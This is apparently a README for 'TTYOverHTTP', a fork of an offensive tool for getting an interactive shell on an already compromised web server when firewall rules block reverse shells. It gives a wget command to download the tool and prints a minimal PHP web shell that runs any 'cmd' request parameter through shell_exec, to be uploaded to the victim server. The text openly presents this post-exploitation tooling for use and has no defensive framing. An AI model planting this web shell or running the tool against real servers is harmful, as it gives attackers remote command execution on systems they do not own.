# TTYOverHTTP
```shell
wget https://raw.githubusercontent.com/jaumesaa/easier-ttyoverhttp/master/tty_over_http.py
```
*esto es un fork de s4vitar, ¿estamos?*
--------------------------------------------
Sometimes when we compromise a web server, there are configured rules (**Ex: iptables**) that prevent us from obtaining a Reverse Shell via Netcat, Python, or another utility.

 With this tool, we avoid having to use a reverse shell to
 obtain a TTY later fully interactive.  Through files
 '**mkfifo**', we play to simulate an interactive TTY over HTTP, achieving
 manage the system comfortably without any type of problem.

 The only thing we need is to upload a PHP structure like the following to the compromised server to execute commands:
```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

 After its execution, you'll have an interactive TTY!

